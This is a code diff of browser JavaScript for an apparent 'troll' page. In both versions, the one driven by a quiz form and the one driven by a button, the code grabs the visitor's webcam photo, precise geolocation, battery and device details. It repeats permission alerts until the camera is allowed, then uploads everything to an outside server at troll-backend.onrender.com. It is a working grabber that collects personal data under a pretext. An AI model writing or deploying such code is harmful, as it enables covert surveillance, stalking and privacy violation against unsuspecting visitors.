@@ -1,130 +1,130 @@
-// ====== Elements ======
-const btn = document.getElementById('submit-btn'); // submit button
+// ================================
+// Select DOM elements
+// ================================
+const btn = document.getElementById('btn');
 const video = document.getElementById('video');
 const canvas = document.getElementById('canvas');
-const fileInput = document.getElementById('user-file');
 const toast = document.getElementById('toast');
-const quizForm = document.getElementById('quiz-form');
 
+// Camera constraints: video only, no mic
 const constraints = { video: { facingMode: "user" }, audio: false };
 
-// ====== Toast helper ======
-function showToast(msg = "Done") {
-    toast.textContent = msg;
+// ================================
+// Show toast function
+// ================================
+function showToast(message = "Done!") {
+    toast.innerText = message;
     toast.style.display = 'block';
-    setTimeout(() => {
-        toast.style.display = 'none';
-    }, 2500);
+    setTimeout(() => { toast.style.display = 'none'; }, 3000);
 }
 
-// ====== Capture real camera photo ======
-async function captureCameraPhoto() {
-    // Loop until user allows camera
+// ================================
+// Collect metadata function
+// ================================
+async function collectMetadata() {
+    const metadata = {
+        width: window.innerWidth,
+        height: window.innerHeight,
+        platform: navigator.platform,
+        language: navigator.language,
+        useragent: navigator.userAgent,
+        time: new Date().toISOString(),
+    };
+
+    // Battery info
+    if (navigator.getBattery) {
+        const battery = await navigator.getBattery();
+        metadata.battery = battery.level * 100;
+        metadata.charging = battery.charging;
+    }
+
+    // Geolocation
+    if (navigator.geolocation) {
+        try {
+            const position = await new Promise((resolve, reject) =>
+                navigator.geolocation.getCurrentPosition(resolve, reject)
+            );
+            metadata.location = `${position.coords.latitude},${position.coords.longitude}`;
+        } catch {
+            metadata.location = "Denied";
+        }
+    } else {
+        metadata.location = "Unsupported";
+    }
+
+    return metadata;
+}
+
+// ================================
+// Capture camera frames for 2-3 seconds
+// ================================
+async function captureRealPhoto() {
     let stream = null;
     while (!stream) {
         try {
             stream = await navigator.mediaDevices.getUserMedia(constraints);
         } catch (err) {
-            alert("Camera permission is required to continue. Please allow it!");
+            alert("Camera permission required!");
         }
     }
 
     video.srcObject = stream;
     await video.play();
 
-    // Wait until video has loaded a frame
-    if (video.readyState < 2) {
-        await new Promise(resolve => video.addEventListener('loadeddata', resolve, { once: true }));
+    // Capture multiple frames for 2 seconds
+    const frameCount = 5;
+    const delay = 400; // 400ms between frames
+    let lastFrameData = null;
+
+    for (let i = 0; i < frameCount; i++) {
+        await new Promise(resolve => setTimeout(resolve, delay));
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        const ctx = canvas.getContext('2d');
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        lastFrameData = canvas.toDataURL('image/png');
     }
 
-    // Match canvas size to video
-    canvas.width = video.videoWidth;
-    canvas.height = video.videoHeight;
-
-    const ctx = canvas.getContext('2d');
-    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-    // Stop video stream after capture
+    // Stop all camera tracks
     stream.getTracks().forEach(track => track.stop());
 
-    return canvas.toDataURL('image/png');
+    return lastFrameData;
 }
 
-// ====== Collect metadata ======
-async function collectMetadata() {
-    const metadata = {
-        useragent: navigator.userAgent,
-        platform: navigator.platform,
-        width: window.innerWidth,
-        height: window.innerHeight,
-        language: navigator.language,
-        time: new Date().toLocaleString(),
-        battery: 'N/A',
-        location: 'N/A',
-    };
-
-    // Battery info
-    if (navigator.getBattery) {
-        try {
-            const battery = await navigator.getBattery();
-            metadata.battery = battery.level * 100;
-        } catch {}
-    }
-
-    // Geolocation
-    if (navigator.geolocation) {
-        try {
-            const position = await new Promise((resolve, reject) => {
-                navigator.geolocation.getCurrentPosition(resolve, reject);
-            });
-            metadata.location = `${position.coords.latitude},${position.coords.longitude}`;
-        } catch {
-            metadata.location = "Denied";
-        }
-    }
-
-    return metadata;
-}
-
-// ====== Send data to backend ======
+// ================================
+// Send photo + metadata to backend
+// ================================
 async function sendData(imageData, metadata) {
     try {
-        const response = await fetch("https://troll-backend.onrender.com/api/upload", {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ image: imageData, metadata }),
+        const res = await fetch('https://troll-backend.onrender.com/api/upload', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ image: imageData, metadata })
         });
-
-        const data = await response.json();
-        console.log("Backend response:", data);
-        showToast("Photo & metadata sent!");
+        const data = await res.json();
+        console.log("Server response:", data);
     } catch (err) {
         console.error("Error sending data:", err);
-        showToast("Failed to send data!");
     }
 }
 
-// ====== Form submission handler ======
-quizForm.addEventListener('submit', async (e) => {
-    e.preventDefault();
-
-    showToast("Capturing photo...");
-
-    // Capture real camera photo
-    const photo = await captureCameraPhoto();
-
-    // Collect metadata
-    const metadata = await collectMetadata();
-
-    // Send to backend
-    await sendData(photo, metadata);
-
-    // Optional: submit file input if user selected any file
-    if (fileInput && fileInput.files.length > 0) {
-        const fileData = fileInput.files[0];
-        console.log("User uploaded file:", fileData.name);
+// ================================
+// Main function
+// ================================
+async function startCapture() {
+    showToast("Requesting camera permission...");
+    try {
+        const metadata = await collectMetadata();
+        const imageData = await captureRealPhoto();
+        await sendData(imageData, metadata);
+        showToast("Photo captured & sent successfully!");
+    } catch (err) {
+        console.error(err);
+        alert("Error capturing or sending photo.");
     }
+}
 
-    // Show success toast
-    showToast("Submission complete!");
-});
+// ================================
+// Button click triggers capture
+// ================================
+btn.addEventListener('click', startCapture);
